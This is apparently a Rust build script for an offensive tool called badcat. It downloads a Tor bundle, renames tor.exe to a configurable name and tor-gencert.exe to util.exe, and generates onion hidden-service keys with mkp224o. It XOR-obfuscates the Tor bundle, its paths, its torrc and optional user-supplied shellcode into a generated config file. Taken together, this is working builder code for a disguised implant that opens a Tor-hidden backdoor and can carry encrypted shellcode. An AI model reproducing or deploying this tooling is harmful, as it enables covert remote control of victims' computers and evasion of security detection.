use std::{fs, error, collections, process};
use std::path::{Path, PathBuf};

use badcat_lib::{xor, http};
use hex::FromHex;

const CFG_TEMPLATE: &str = "config.rs.template";
const CFG_DESTINATION: &str = "src/config.rs";

struct BuildSetting {
    is_tor_for_windows: bool,
    key: String,
    windows_url: String,
    windows_dir: String,
    linux_url: String,
    linux_dir: String,
    torrc: String,
    name: String,
    shellcode: String
}

fn main() -> Result<(), Box<dyn error::Error>> {
    let raw_settings: json::JsonValue = load_settings()?;

    let setting = parse_settings(&raw_settings);

    let mut torrc = fs::read_to_string(&setting.torrc)?;

    let platform_tor_dir;

    if setting.is_tor_for_windows {
        platform_tor_dir = &setting.windows_dir;
    } else {
        platform_tor_dir = &setting.linux_dir;

        torrc += r#"
ControlSocketsGroupWritable 1
ControlSocket @{CTRL_SOCKET}
"#;
    }

    let tor_dir = Path::new(&platform_tor_dir)
        .join(&setting.name)
        .join("App");

    let mut replacements = collections::HashMap::new();

    replacements.insert("@{NAME}", setting.name.clone());
    replacements.insert("@{ENC_KEY}", setting.key.clone());

    let enc_tor_dir = xor::encode(
        &setting.key,
        &String::from(tor_dir.to_str().unwrap())
    );
    replacements.insert("@{ENC_TOR_DIR}", enc_tor_dir);

    let enc_torrc = xor::encode(
        &setting.key,
        &torrc
    );
    replacements.insert("@{ENC_TORRC}", enc_torrc);

    replacements.insert("@{ENC_TOR_BUNDLE}", bundle_tor(&setting)?);

    let enc_shellcode = if &setting.shellcode == "" {
        String::from("")
    } else {
        let bytes: Vec<u8> = Vec::from_hex(&setting.shellcode)?;
        xor::encode_bytes(&setting.key, &bytes)
    };

    replacements.insert("@{ENC_SHELLCODE}", enc_shellcode);

    replace_settings(
        CFG_TEMPLATE,
        CFG_DESTINATION,
        &replacements
    )?;

    Ok(())
}

fn bundle_tor(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
    let url = if setting.is_tor_for_windows { &setting.windows_url } else { &setting.linux_url };

    let tmp_dir;

    if url.starts_with("file://") {
        let local_dir = url.strip_prefix("file://").unwrap();
        tmp_dir = tempfile::tempdir()?;
        
        badcat_lib::fs::copy_dir(
            &PathBuf::from(local_dir),
            &tmp_dir.path().to_path_buf()
        )?;
    } else {
        tmp_dir = download_and_extract_tor(&url, setting)?;
    }

    let dir = tmp_dir.path().to_str().unwrap();
    let hs_addr = generate_hs_secrets(dir)?;

    let mut archive = tar::Builder::new(Vec::new());
    archive.append_dir_all(&setting.name, &dir)?;

    let data = archive.into_inner()?;

    let bundle = xor::encode_bytes(&setting.key, &data);
    Ok(bundle)
}

fn generate_hs_secrets(
    to_dir: &str,
) -> Result<String, Box<dyn error::Error>> {
    let temp_dir = tempfile::tempdir()?;

    let proc = process::Command::new("mkp224o")
        .args(["-n", "1", "-d", temp_dir.path().to_str().unwrap(), "-q", "a"])
        .output()?;

    if !proc.status.success() {
        println!("{}", String::from_utf8(proc.stderr)?);
        return Err(String::from("problem generating hidden service keys").into());
    }

    let output = String::from_utf8(proc.stdout)?;
    let hs_addr = output.strip_suffix("\n").unwrap();

    // mkp224o stores the files with this structure
    let secrets_dir = temp_dir.path().join(hs_addr);

    let dir = Path::new(to_dir).join("App");

    fs::copy(secrets_dir.join("hostname"), dir.join("hostname"))?;
    fs::copy(secrets_dir.join("hs_ed25519_public_key"), dir.join("hs_ed25519_public_key"))?;
    fs::copy(secrets_dir.join("hs_ed25519_secret_key"), dir.join("hs_ed25519_secret_key"))?;

    fs::copy(secrets_dir.join("hostname"), Path::new("../hostname"))?;

    Ok(String::from(hs_addr))
}

fn download_and_extract_tor(
    url: &String,
    setting: &BuildSetting
) -> Result<tempfile::TempDir, Box<dyn error::Error>> {
    let file = tempfile::NamedTempFile::new()?;

    http::download(url, &mut file.reopen()?)?;

    let dir = tempfile::tempdir()?;
    let path = dir.path().to_owned();

    if setting.is_tor_for_windows {
        let mut zip = zip::ZipArchive::new(file)?;
        zip.extract(&dir)?;

        fs::rename(path.join("Tor"), path.join("App"))?;

        fs::rename(
            path.join("App").join("tor.exe"),
            path.join("App").join(format!("{}.exe", &setting.name))
        )?;

        fs::rename(
            path.join("App").join("tor-gencert.exe"),
            path.join("App").join("util.exe")
        )?;

        fs::remove_dir_all(path.join("Data"))?;
    } else {
        let status = process::Command::new("tar")
            .args(["-xf", file.path().to_str().unwrap()])
            .current_dir(&dir)
            .status()?;

        if !status.success() {
            return Result::Err(String::from("problem extracting archive").into());
        }
    }

    Ok(dir)
}

fn load_settings() -> Result<json::JsonValue, Box<dyn error::Error>> {
    let source = fs::read_to_string("settings.json")
        .expect("failed to read settings");
    Ok(json::parse(&source)?)
}

fn replace_settings(
    template: &str,
    destinaion: &str,
    replacements: &collections::HashMap<&str, String>
) -> Result<(), Box<dyn error::Error>> {
    let mut config_source = fs::read_to_string(template)?;

    for (pattern, content) in replacements {
        config_source = config_source.replace(pattern, &content);
    }

    fs::write(destinaion, config_source)?;

    Ok(())
}

fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
    let key = if raw.has_key("key") {
        String::from(
            raw["key"].as_str().unwrap_or_else(|| {
                panic!("key must be a string");
            })
        )
    } else {
        xor::secret_key()
    };

    let windows_url = String::from(
        raw["tor_urls"]["windows"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("windows url must be a string");
            })
    );

    let linux_url = String::from(
        raw["tor_urls"]["linux"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("linux url must be a string");
            })
    );

    let windows_dir = String::from(
        raw["tor_dirs"]["windows"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("windows path must be a string");
            })
    );

    let linux_dir = String::from(
        raw["tor_dirs"]["linux"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("linux path must be a string");
            })
    );

    let torrc = String::from(
        raw["torrc"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("torrc must be a string");
            })
    );

    let name = String::from(
        raw["name"]
            .as_str()
            .unwrap_or_else(|| {
                panic!("name must be a string");
            })
    );

    let shellcode = String::from(
        raw["shellcode"]
            .as_str()
            .unwrap_or_else(|| {
                ""
            })
    );

    BuildSetting {
        is_tor_for_windows: cfg!(feature = "tor_for_windows"),
        key,
        windows_url,
        windows_dir,
        linux_url,
        linux_dir,
        torrc,
        name,
        shellcode,
    }
}